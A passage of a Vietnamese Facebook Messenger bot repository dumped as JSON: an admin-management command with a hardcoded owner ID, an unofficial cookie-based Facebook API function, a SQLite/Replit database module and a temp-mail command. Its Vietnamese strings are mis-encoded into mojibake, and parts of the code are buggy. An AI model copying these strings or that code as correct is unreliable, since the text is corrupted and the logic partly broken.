ùöçùöûÃÄùöóùöê  „Äè ===\\n‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±\\n\\n‚Üí admin add => th√™m ng∆∞·ªùi d√πng l√†m adminbot\\n‚Üí admin sp => th√™m ng∆∞·ªùi d√πng l√†m support bot\\n‚Üí admin list => xem danh s√°ch c√°c admin \\n‚Üí admin remove => g·ª° b·ªè adminbot\\n‚Üí admin delete => g·ª° b·ªè Support Bot\\n‚Üí admin qtvonly => b·∫≠t/t·∫Øt ch·∫ø ƒë·ªô ch·ªâ qu·∫£n tr·ªã vi√™n nh√≥m d√πng bot\\n‚Üí admin only => b·∫≠t/t·∫Øt ch·∫ø ƒë·ªô ch·ªâ admin m·ªõi d√πng ƒë∆∞·ª£c bot\\n‚Üí admin support => b·∫≠t/t·∫Øt ch·∫ø ƒë·ªô ch·ªâ support bot m·ªõi d√πng ƒë∆∞·ª£c bot\\n‚Üí admin ibrieng => b·∫≠t/t·∫Øt ch·∫ø ƒë·ªô ib ri√™ng v·ªõi bot\\n‚Üí HDSD: ${global.config.PREFIX}admin l·ªánh b·∫°n c·∫ßn d√πng!!!\\n‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±\\n===„Äå${timeNow}„Äç===`, event.threadID, event.messageID);\n    const { threadID, messageID, mentions } = event;\n    const { configPath } = global.client;\n    const { ADMINBOT } = global.config;\n    const { NDH } = global.config;\n    const { userName } = global.data;\n    const { writeFileSync } = global.nodemodule[\"fs-extra\"];\n    const mention = Object.keys(mentions);\n\n    delete require.cache[require.resolve(configPath)];\n    var config = require(configPath);\n    switch (args[0]) {\n        case \"list\": {\n          var i = 1\n        var msg = [];\n          listAdmin = ADMINBOT || config.ADMINBOT ||  [];\n            var msg = [];\n            for (const idAdmin of listAdmin) {\n                if (parseInt(idAdmin)) {\n                  const name = (await Users.getData(idAdmin)).name\n                    msg.push(`${i++}. ${name}\\n‚Üí Link: fb.me/${idAdmin}`);\n                }\n            }\n          var i = 1\n        var msg1 = [];\n          listNDH = NDH || config.NDH ||  [];\n            var msg1 = [];\n            for (const idNDH of listNDH) {\n                if (parseInt(idNDH)) {\n                  const name1 = (await Users.getData(idNDH)).name\n                    msg1.push(`${i++}. ${name1}\\n‚Üí Link: fb.me/${idNDH}`);\n                }\n            }\nreturn api.sendMessage(`===== ADMINBOT =====\\n¬ª============¬´\\n\\n${msg.join(\"\\n\")}\\n\\n‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äîüî±‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî\\n\\n==== SUPPORTBOT ====\\n¬ª============¬´\\n\\n${msg1.join(\"\\n\\n\")}`, event.threadID, event.messageID)\n        }\n        case \"add\": { \n            if (event.senderID != 100040472494187) return api.sendMessage(`B·∫°n Kh√¥ng C√≥ Quy·ªÅn!!!`, event.threadID, event.messageID)\n            if(event.type == \"message_reply\") { content[0] = event.messageReply.senderID }\n            if (mention.length != 0 && isNaN(content[0])) {\n                var listAdd = [];\n\n                for (const id of mention) {\n                    ADMINBOT.push(id);\n                    config.ADMINBOT.push(id);\n                    listAdd.push(`‚Üí UID: ${id}\\n‚Üí T√™n ADMINBOT m·ªõi: ${event.mentions[id]}`);\n                };\n\n                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');\n                return api.sendMessage(getText(\"addedNewAdmin\", mention.length, listAdd.join(\"\\n\").replace(/\\@/g, \"\")), threadID, messageID);\n            }\n            else if (content.length != 0 && !isNaN(content[0])) {\n                ADMINBOT.push(content[0]);\n                config.ADMINBOT.push(content[0]);\n                const name = (await Users.getData(content[0])).name\n                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');\n                return api.sendMessage(getText(\"addedNewAdmin\", 1, ` ADMIN \\n‚Üí T√™n ADMINBOT m·ªõi: ${name}`), threadID, messageID);\n            }\n            else return global.utils.throwError(this.config.name, threadID, messageID);\n        }\ncase \"sp\": {\n            if (event.senderID != 100040472494187) return api.sendMessage(`B·∫°n Kh√¥ng C√≥ Quy·ªÅn!!!`, event.threadID, event.messageID)\n            if(event.type == \"message_reply\") { content[0] = event.messageReply.senderID }\n            if (mention.length != 0 && isNaN(content[0])) {\n                var listAdd = [];\n\n                for (const id of mention) {\n                    NDH.push(id);\n                    config.NDH.push(id);\n                    listAdd.push(` ${id}  ‚Üí ${event.mentions[id]}`);\n                };\n\n                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');\n                return api.sendMessage(getText(\"adminsupport\", 1, `==== ADMIN SP ====\\n‚Üí ${name}`), threadID, messageID);\n            }\n            else if (content.length != 0 && !isNaN(content[0])) {\n                NDH.push(content[0]);\n                config.NDH.push(content[0]);\n                const name = (await Users.getData(content[0])).name\n                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');\n                return api.sendMessage(getText(\"adminsupport\", 1, ` ADMIN SP  ‚Üí ${name}`), threadID, messageID);\n            }\n            else return global.utils.throwError(this.config.name, threadID, messageID);\n        }\n        case \"remove\": {\n            if (event.senderID != 100040472494187) return api.sendMessage(`B·∫°n Kh√¥ng C√≥ Quy·ªÅn!!!`, event.threadID, event.messageID)\n            if(event.type == \"message_reply\") { content[0] = event.messageReply.senderID }\n            if (mentions.length != 0 && isNaN(content[0])) {\n                const mention = Object.keys(mentions);\n                var listAdd = [];\n\n                for (const id of mention) {\n                    const index = config.ADMINBOT.findIndex(item => item == id);\n                    ADMINBOT.splice(index, 1);\n                    config.ADMINBOT.splice(index, 1);\n                    listAdd.push(` UID: ${id}\\n‚Üí ${event.mentions[id]}`);\n                };\n\n                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');\n                return api.sendMessage(getText(\"removedAdmin\", mention.length, listAdd.join(\"\\n\").replace(/\\@/g, \"\")), threadID, messageID);\n            }\n            else if (content.length != 0 && !isNaN(content[0])) {\n                const index = config.ADMINBOT.findIndex(item => item.toString() == content[0]);\n                ADMINBOT.splice(index, 1);\n                config.ADMINBOT.splice(index, 1);\n                const name = (await Users.getData(content[0])).name\n                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');\n                return api.sendMessage(getText(\"removedAdmin\", 1, ` ${content[0]} ‚Üí ${name}`), threadID, messageID);\n            }\n            else global.utils.throwError(this.config.name, threadID, messageID);\n        }\n        case \"delete\": {\n            if (event.senderID != 100040472494187) return api.sendMessage(`B·∫°n Kh√¥ng C√≥ Quy·ªÅn!!!`, event.threadID, event.messageID)\n            if(event.type == \"message_reply\") { content[0] = event.messageReply.senderID }\n            if (mentions.length != 0 && isNaN(content[0])) {\n                const mention = Object.keys(mentions);\n                var listAdd = [];\n\n                for (const id of mention) {\n                    const index = config.NDH.findIndex(item => item == id);\n                    NDH.splice(index, 1);\n                    config.NDH.splice(index, 1);\n                    listAdd.push(` ${id}  ¬ª ${event.mentions[id]}`);\n                };\n\n                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');\n                return api.sendMessage(getText(\"removedAdminSuport\", mention.length, listAdd.join(\"\\n\").replace(/\\@/g, \"\")), threadID, messageID);\n            }\n            else if (content.length != 0 && !isNaN(content[0])) {\n                const index = config.NDH.findIndex(item => item.toString() == content[0]);\n                NDH.splice(index, 1);\n                config.NDH.splice(index, 1);\n                const name = (await Users.getData(content[0])).name\n                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');\n                return api.sendMessage(getText(\"removedAdminSupport\", 1, ` ${content[0]}  ‚Üí ${name}`), threadID, messageID);\n            }\n            else global.utils.throwError(this.config.name, threadID, messageID);\n        }\n        case 'qtvonly': {\n           if (permssion < 1) return api.sendMessage(\"Ch·ªâ QTVBOX m·ªõi c√≥ th·ªÉ s·ª≠ d·ª•ng l·ªánh n√†y\", threadID, messageID);\n        const { resolve } = require(\"path\");\n        const pathData = resolve(__dirname, 'cache', 'data.json');\n        const database = require(pathData);\n        const { adminbox } = database;   \n        if (adminbox[threadID] == true) {\n            adminbox[threadID] = false;\n            api.sendMessage(\" ‚Üí T·∫Øt th√†nh c√¥ng ch·∫ø ƒë·ªô Qu·∫£n tr·ªã vi√™n t·∫•t c·∫£ m·ªçi ng∆∞·ªùi ƒë·ªÅu c√≥ th·ªÉ s·ª≠ d·ª•ng bot\", threadID, messageID);\n        } else {\n            adminbox[threadID] = true;\n            api.sendMessage(\"‚Üí B·∫≠t th√†nh c√¥ng ch·∫ø ch·ªâ Qu·∫£n tr·ªã vi√™n nh√≥m m·ªõi c√≥ th·ªÉ s·ª≠ d·ª•ng bot\", threadID, messageID);\n        }\n        writeFileSync(pathData, JSON.stringify(database, null, 4));\n        break;\n    }\n    case 'only':\n        case '-o': {\n            if (event.senderID != 100040472494187) return api.sendMessage(`B·∫°n Kh√¥ng C√≥ Quy·ªÅn!!!`, event.threadID, event.messageID)\n            if (config.adminOnly == false) {\n                config.adminOnly = true;\n                api.sendMessage(`‚Üí B·∫≠t th√†nh c√¥ng ch·ªâ ADMINBOT m·ªõi d√πng ƒë∆∞·ª£c bot`, threadID, messageID);\n            } else {\n                config.adminOnly = false;\n                api.sendMessage(`‚Üí T·∫Øt th√†nh c√¥ng ch·ªâ ADMINBOT m·ªõi d√πng ƒë∆∞·ª£c bot`, threadID, messageID);\n            }\n                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');\n                break;\n              }\n        case 'support':\n        case '-sp': {\n            //---> CODE ADMIN ONLY<---//\n            if (permssion < 2) return api.sendMessage(\" Xin l·ªói! l·ªánh n√†y ch·ªâ admin support m·ªõi d√πng ƒë∆∞·ª£c\", threadID, messageID);\n            if (config.ndhOnly == false) {\n                config.ndhOnly = true;\n                api.sendMessage(`‚Üí B·∫≠t th√†nh c√¥ng ch·ªâ SUPPORTBOT m·ªõi d√πng ƒë∆∞·ª£c bot`, threadID, messageID);\n            } else {\n                config.ndhOnly = false;\n                api.sendMessage(`‚Üí T·∫Øt th√†nh c√¥ng ch·ªâ SUPPORTBOT m·ªõi d√πng ƒë∆∞·ª£c bot`, threadID, messageID);\n            }\n                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');\n                break;\n              }\n        case 'ibrieng': {\n                if (permssion != 3) return api.sendMessage(` Xin l·ªói! l·ªánh n√†y ch·ªâ ADMINBOT m·ªõi d√πng ƒë∆∞·ª£c`, threadID, messageID);\n                   if (config.adminPaseOnly == false) {\n                    config.adminPaseOnly = true;\n                    api.sendMessage(`‚Üí B·∫≠t th√†nh c√¥ng ch·ªâ ADMINBOT m·ªõi chat ri√™ng ƒë∆∞·ª£c v·ªõi bot üîí`, threadID, messageID);\n                } else {\n                    config.adminPaseOnly = false;\n                    api.sendMessage(`‚Üí T·∫Øt th√†nh c√¥ng ch·ªâ ADMINBOT m·ªõi chat ri√™ng ƒë∆∞·ª£c v·ªõi bot üîì `, threadID, messageID);\n                }\n                    writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');\n                    break;\n                  }\n        default: {\n            return global.utils.throwError(this.config.name, threadID, messageID);\n        }\n    };\n}","path":null,"size_bytes":13521,"size_tokens":null},"lib/fca-auto/src/muteThread.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  // muteSecond: -1=permanent mute, 0=unmute, 60=one minute, 3600=one hour, etc.\n  return function muteThread(threadID, muteSeconds, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      thread_fbid: threadID,\n      mute_settings: muteSeconds\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/change_mute_thread.php\", ctx.jar, form)\n      .then(utils.saveCookies(ctx.jar))\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) {\n          throw resData;\n        }\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"muteThread\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1198,"size_tokens":null},"lib/fca-auto/Extra/Database/index.js":{"content":"/* eslint-disable no-self-assign */\n/* eslint-disable linebreak-style */\nconst get = require('lodash/get');\nconst set = require('lodash/set');\nconst BetterDB = require(\"better-sqlite3\");\nconst fs = require('fs-extra');\nconst request = require('request');\nconst deasync = require('deasync');\n\nif (!fs.existsSync(process.cwd() + '/Horizon_Database')) {\n    fs.mkdirSync(process.cwd() + '/Horizon_Database');\n    fs.writeFileSync(process.cwd() + '/Horizon_Database/A_README.md', 'This folder is used by ChernobyL(NANI =)) ) to store data. Do not delete this folder or any of the files in it.', 'utf8');\n}\nvar db = new BetterDB(process.cwd() + \"/Horizon_Database/SyntheticDatabase.sqlite\");\n\nfunction Lset(key, value) {\n    if (!key)\n        throw new TypeError(\n            \"No key specified.\"\n        );\n    return arbitrate(\"set\",{\n        stringify: false,\n        id: key,\n        data: value,\n        ops:  {},\n    });\n}\n\nfunction Lget(key) {\n    if (!key)\n        throw new TypeError(\n            \"No key specified.\"\n        );\n    return arbitrate(\"fetch\", { id: key, ops: {} || {} });\n}\n\nfunction Lhas(key) {\n    if (!key)\n        throw new TypeError(\n            \"No key specified.\"\n        );\n    return arbitrate(\"has\", { id: key, ops: {} });\n}\n\nfunction Lremove(key) {\n    if (!key)\n        throw new TypeError(\n            \"No key specified.\"\n        );\n    return arbitrate(\"delete\", { id: key, ops: {} });\n}\n\nfunction LremoveMultiple(key) {\n    if (!key)\n        throw new TypeError(\n            \"No key specified.\"\n        );\n        try {\n            for (let i of key) {\n                arbitrate(\"delete\", { id: i, ops: {} });\n            }\n            return true;\n        } \n    catch (err) {\n        return false;\n    }\n}\n\nfunction Llist() {\n    return arbitrate(\"all\",{ ops: {} });\n}\n\nfunction Replit_Set(key, value) {\n    try {\n        var done = false;\n        \n        request({\n            url: process.env.REPLIT_DB_URL,\n            method: \"POST\",\n            headers: {\n                'Content-Type': 'application/x-www-form-urlencoded',\n            },  \n            body: `${encodeURIComponent(key)}=${encodeURIComponent(JSON.stringify(value))}`\n        \n        }, function (error, response, body) {\n            done = true;\n        });\n\n        deasync.loopWhile(function(){\n            return !done;\n        });\n\n        return;\n        \n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Replit_Get(key) {\n    try {\n        var done = false;\n        var response = null;\n    \n        request(process.env.REPLIT_DB_URL + \"/\" + key, function (error, res, body) {\n            if (!error && res.statusCode == 200) {\n                response = body;\n            }\n            done = true;\n        });\n    \n        deasync.loopWhile(function(){\n            return !done;\n        });\n    \n        return JSON.parse(response);\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Replit_Has(key) {\n    try {\n        var done = false;\n        var response = null;\n\n        request(process.env.REPLIT_DB_URL + \"/\" + key, function (error, res, body) {\n            if (!error && res.statusCode == 200) {\n                response = body;\n            }\n            done = true;\n        });\n\n        deasync.loopWhile(function(){\n            return !done;\n        });\n\n        return response != null;\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Replit_Remove(key) {\n    try {\n        var done = false;\n        request.delete(process.env.REPLIT_DB_URL + \"/\" + key , function (error, response, body) {\n            done = true;\n        });\n\n        deasync.loopWhile(function(){\n            return !done;\n        });\n\n        return;\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\nfunction Replit_RemoveMultiple(keys) {\n    try {\n        for (const key of keys) {\n            request.delete(process.env.REPLIT_DB_URL + \"/\" + key , function (error, response, body) {});\n        }\n        return true;\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Replit_List() {\n    var done = false;\n    var response = null;\n\n    request(process.env.REPLIT_DB_URL + \"?encode=true\" + `&prefix=${encodeURIComponent(\"\")}`, function (error, res, body) {\n        if (!error && res.statusCode == 200) {\n            response = body;\n        }\n        done = true;\n\n    });\n\n    deasync.loopWhile(function(){\n        return !done;\n    });\n\n    if (response.length === 0) {\n        return [];\n    }\n    return response.split(\"\\n\").map(decodeURIComponent);\n}\n\n\nvar methods = {\n    fetch: function(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) return null;\n        try { \n            fetched = JSON.parse(fetched.json);\n        } catch (e) {\n            fetched = fetched.json;\n        }\n        return fetched;\n    },\n    set: function(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) {\n            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');\n            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        }\n        try { \n            fetched = JSON.parse(fetched); \n        } catch (e) {\n            fetched = fetched;\n        }\n        if (typeof fetched === 'object' && params.ops.target) {\n            params.data = JSON.parse(params.data);\n            params.data = set(fetched, params.ops.target, params.data);\n        } \n        else if (params.ops.target) throw new TypeError('Cannot target a non-object.');\n        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(JSON.stringify(params.data), params.id);\n        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;\n        if (newData === '{}') return null;\n        else {\n            try { newData = JSON.parse(newData); \n            } \n            catch (e) {\n                newData = newData;\n            }\n            return newData;\n        }\n    },\n    add: function addDB(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) {\n            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');\n            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id); \n        }\n        if (params.ops.target) {\n            try { \n                fetched = JSON.parse(fetched); \n            }\n            catch (e) {\n                fetched = fetched;\n            }\n            let oldValue = get(fetched, params.ops.target);\n            if (oldValue === undefined) oldValue = 0;\n            else if (isNaN(oldValue)) throw new Error(`Data @ ID: \"${params.id}\" IS NOT A number.\\nFOUND: ${fetched}\\nEXPECTED: number`);\n            params.data = set(fetched, params.ops.target, oldValue + JSON.parse(params.data));\n        } \n        else {\n            if (fetched.json === '{}') fetched.json = 0;\n            try { \n                fetched.json = JSON.parse(fetched); \n            } catch (e) {\n                fetched.json = fetched.json;\n            }\n            if (isNaN(fetched.json)) throw new Error(`Data @ ID: \"${params.id}\" IS NOT A number.\\nFOUND: ${fetched.json}\\nEXPECTED: number`);\n            params.data = parseInt(fetched.json, 10) + parseInt(params.data, 10);\n        }\n        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(JSON.stringify(params.data), params.id);\n        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;\n        if (newData === '{}') return null;\n        else {\n            try {  \n                newData = JSON.parse(newData); \n            } \n            catch (e) {\n                newData = newData;\n            }\n            return newData;\n        }\n    },\n    subtract: function subtractDB(db, params, options) {\n       let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) {\n            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');\n            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id); \n        }\n        if (params.ops.target) {\n            try { fetched = JSON.parse(fetched); } catch (e) {}\n            params.data = JSON.parse(params.data);\n            let oldValue = get(fetched, params.ops.target);\n            if (oldValue === undefined) oldValue = 0;\n            else if (isNaN(oldValue)) throw new Error('Target is not a number.');\n            params.data = set(fetched, params.ops.target, oldValue - params.data);\n        } else {\n            if (fetched.json === '{}') fetched.json = 0;\n            else fetched.json = JSON.parse(fetched.json);\n            try { fetched.json = JSON.parse(fetched); } catch (e) {}\n            if (isNaN(fetched.json)) throw new Error('Target is not a number.');\n            params.data = parseInt(fetched.json, 10) - parseInt(params.data, 10);\n        }\n        params.data = JSON.stringify(params.data);\n        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(params.data, params.id);\n        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;\n        if (newData === '{}') return null;\n        else {\n            try { newData = JSON.parse(newData); } catch (e) {}\n            return newData;\n        }\n    },\n    push: function pushDB(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) {\n            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');\n            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id); \n        }\n        if (params.ops.target) {\n            fetched = JSON.parse(fetched.json);\n        try { fetched = JSON.parse(fetched); } catch (e) {}\n            params.data = JSON.parse(params.data);\n        if (typeof fetched !== 'object') throw new TypeError('Cannot push into a non-object.');\n        let oldArray = get(fetched, params.ops.target);\n        if (oldArray === undefined) oldArray = [];\n        else if (!Array.isArray(oldArray)) throw new TypeError('Target is not an array.');\n            oldArray.push(params.data);\n            params.data = set(fetched, params.ops.target, oldArray);\n        } else {\n        if (fetched.json === '{}') fetched.json = [];\n        else fetched.json = JSON.parse(fetched.json);\n        try { fetched.json = JSON.parse(fetched.json); } catch (e) {}\n            params.data = JSON.parse(params.data);\n        if (!Array.isArray(fetched.json)) throw new TypeError('Target is not an array.');\n            fetched.json.push(params.data);\n            params.data = fetched.json;\n        }\n        params.data = JSON.stringify(params.data);\n        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(params.data, params.id);\n        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;\n        if (newData === '{}') return null;\n        else {\n            newData = JSON.parse(newData);\n        try { newData = JSON.parse(newData); } catch (e) {}\n        return newData;\n        }\n    },\n    delete: function deleteDB(db, params, options) {\n        const unset = require('lodash/unset');\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) return false;\n        else fetched = JSON.parse(fetched.json);\n        try { fetched = JSON.parse(fetched); } catch (e) {}\n        if (typeof fetched === 'object' && params.ops.target) {\n            unset(fetched, params.ops.target);\n            fetched = JSON.stringify(fetched);\n            db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(fetched, params.id);\n        return true;\n        }\n        else if (params.ops.target) throw new TypeError('Target is not an object.');\n        else db.prepare(`DELETE FROM ${options.table} WHERE ID = (?)`).run(params.id);\n        return true;\n    },\n    has: function hasDB(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) return false;\n        else fetched = JSON.parse(fetched.json);\n        try { fetched = JSON.parse(fetched); } catch (e) {}\n        if (params.ops.target) fetched = get(fetched, params.ops.target);\n        return (typeof fetched != 'undefined');\n    },\n    all: function allDB(db, params, options) {\n        var stmt = db.prepare(`SELECT * FROM ${options.table} WHERE ID IS NOT NULL`);\n        let resp = [];\n        for (var row of stmt.iterate()) {\n            try {\n            resp.push({\n                ID: row.ID,\n                data: JSON.parse(row.json)\n            });\n            } \n            catch (e) {\n                return [];\n            }\n        }\n        return resp;\n    },\n    type: function typeDB(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) return null; // If empty, return null\n        fetched = JSON.parse(fetched.json);\n        try { fetched = JSON.parse(fetched); } catch (e) {}\n        if (params.ops.target) fetched = get(fetched, params.ops.target); // Get prop using dot notation\n        return typeof fetched;\n    },\n    clear: function clearDB(db, params, options) {\n        let fetched = db.prepare(`DELETE FROM ${options.table}`).run();\n        if(!fetched) return null;\n        return fetched.changes;\n        \n    }\n};\n\n\nfunction arbitrate(method, params) {\n    let options = {table: \"json\"};\n    db.prepare(`CREATE TABLE IF NOT EXISTS ${options.table} (ID TEXT, json TEXT)`).run();\n    if (params.ops.target && params.ops.target[0] === \".\") params.ops.target = params.ops.target.slice(1); // Remove prefix if necessary\n    if (params.data && params.data === Infinity) throw new TypeError(`You cannot set Infinity into the database @ ID: ${params.id}`);\n    if (params.id && typeof params.id == \"string\" && params.id.includes(\".\")) {\n        let unparsed = params.id.split(\".\");\n        params.id = unparsed.shift();\n        params.ops.target = unparsed.join(\".\");\n    }\n    return methods[method](db, params, options);\n}\n\n\nmodule.exports = function ChernobyL(Local) {\n    if (Local && process.env[\"REPL_ID\"]) {\n        return {\n            set: Lset,\n            get: Lget,\n            has: Lhas,\n            delete: Lremove,\n            deleteMultiple: LremoveMultiple,\n            list: Llist\n        };\n    } else if (!Local && process.env[\"REPL_ID\"]) {\n        return {\n            set: Replit_Set,\n            get: Replit_Get,\n            has: Replit_Has,\n            delete: Replit_Remove,\n            deleteMultiple: Replit_RemoveMultiple,\n            list: Replit_List\n        };\n    }\n    else if (Local && !process.env[\"REPL_ID\"]) {\n        return {\n            set: Lset,\n            get: Lget,\n            has: Lhas,\n            delete: Lremove,\n            deleteMultiple: LremoveMultiple,\n            list: Llist\n        };\n    }\n    else if (!Local && !process.env[\"REPL_ID\"]) {\n        return {\n            set: Lset,\n            get: Lget,\n            has: Lhas,\n            delete: Lremove,\n            deleteMultiple: LremoveMultiple,\n            list: Llist\n        };\n    }\n    else {\n        return {\n            set: Lset,\n            get: Lget,\n            has: Lhas,\n            delete: Lremove,\n            deleteMultiple: LremoveMultiple,\n            list: Llist\n        };\n    }\n};","path":null,"size_bytes":15930,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getEmojiUrl.js":{"content":"\"use strict\";\n\nconst util = require(\"util\");\n\nmodule.exports = function () {\n  return function getEmojiUrl(c, size, pixelRatio) {\n    /*\n     Resolves Facebook Messenger emoji image asset URL for an emoji character.\n     Supported sizes are 32, 64, and 128.\n     Supported pixel ratios are '1.0' and '1.5' (possibly more; haven't tested)\n     */\n    const baseUrl = \"https://static.xx.fbcdn.net/images/emoji.php/v8/z%s/%s\";\n    pixelRatio = pixelRatio || \"1.0\";\n\n    let ending = util.format(\n      \"%s/%s/%s.png\",\n      pixelRatio,\n      size,\n      c.codePointAt(0).toString(16)\n    );\n    let base = 317426846;\n    for (let i = 0; i < ending.length; i++) base = (base << 5) - base + ending.charCodeAt(i);\n\n    let hashed = (base & 255).toString(16);\n    return util.format(baseUrl, hashed, ending);\n  };\n};\n","path":null,"size_bytes":810,"size_tokens":null},"modules/commands/mail10p.js":{"content":"module.exports.config = {\n  name: \"mail10p\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"tdunguwu\",\n  description: \"l·∫•y mail ·ªü 10mm th√¥i\",\n  commandCategory: \"Ti·ªán √≠ch\",\n  usages: \"\",\n  cooldowns: 2,\n  dependencies: {\"axios\" : \"\"}\n};\nmodule.exports.run = async({api, event, args}) => {\n  const axios = require('axios');\n  if (args[0] == \"new\") {\n    const res = await axios.get(`https://10minutemail.net/address.api.php?new=1`);\n  var user = res.data.mail_get_user;\n  var host = res.data.mail_get_host;\n  var time = res.data.mail_get_time;\n  var stime = res.data.mail_server_time;\n  var kmail = res.data.mail_get_key;\n  var ltime = res.data.mail_left_time;\n  var mid = res.data.mail_list[0].mail_id;\nvar sub = res.data.mail_list[0].subject;\nvar date = res.data.mail_list[0].datetime2;\n  return api.sendMessage(`¬ª T√™n mail: ${user}\\n¬ª Host: ${host}\\n¬ª Mail ${user}@${host} (.)com\\n¬ª Th·ªùi gian: ${time}\\n¬ª Th·ªùi gian ·ªü server: ${stime}\\n¬ª Key: ${kmail}\\n¬ª Th·ªùi gian c√≤n l·∫°i: ${ltime}s\\n¬ª Mail id: ${mid}\\n¬ª N·ªôi dung ${sub}\\n¬ª Date: ${date}`, event.threadID, event.messageID)\n}\nelse if (args[0] == \"list\") {\n  const res = await axios.get(`https://www.phamvandienofficial.xyz/mail10p/domain`);\n  var list = res.data.domain\n  return api.sendMessage(`List domain: \\n${list}`, event.threadID, event.messageID)\n}\nelse if (args[0] == \"more\") {\n const res = await axios.get(`https://10minutemail.net/address.api.php?more=1`);\n  var user = res.data.mail_get_user;\n  var host = res.data.mail_get_host;\n  var time = res.data.mail_get_time;\n  var stime = res.data.mail_server_time;\n  var kmail = res.data.mail_get_key;\n  var ltime = res.data.mail_left_time;\n  var mid = res.data.mail_list[0].mail_id;\nvar sub = res.data.mail_list[0].subject;\nvar date = res.data.mail_list[0].datetime2;\n  return api.sendMessage(`¬ª T√™n mail: ${user}\\n¬ª Host: ${host}\\n¬ª Mail ${user}@${host} (.)com\\n¬ª Th·ªùi gian: ${time}\\n¬ª Th·ªùi gian ·ªü server: ${stime}\\n¬ª Key: ${kmail}\\n¬ª Th·ªùi gian c√≤n l·∫°i: ${ltime}s\\n¬ª Mail id: ${mid}\\n¬ª N·ªôi dung ${sub}\\n¬ª Date: ${date}`, event.threadID, event.messageID)\n}\nelse if (args[0] == \"get\") {\n   var get = await  axios.get(`https://10minutemail.net/address.api.php`)\n      var data = get.data\n      var mail = data.mail_get_mail,\n        id = data.session_id,\n        url = data.permalink.url,\n        key_mail = data.permalink.key\n      let urlMail = url.replace(/\\./g,' . ')\n      let maill = mail.replace(/\\./g,' . ')\n      return api.sendMessage(`¬ª Email: ${maill}\\n¬ª ID Mail: ${id}\\n¬ª Url Mail: ${urlMail}\\n¬ª Key Mail: ${key_mail}`, event.threadID, event.messageID)}\nelse if (args[0] == \"check\") {\n  var get = 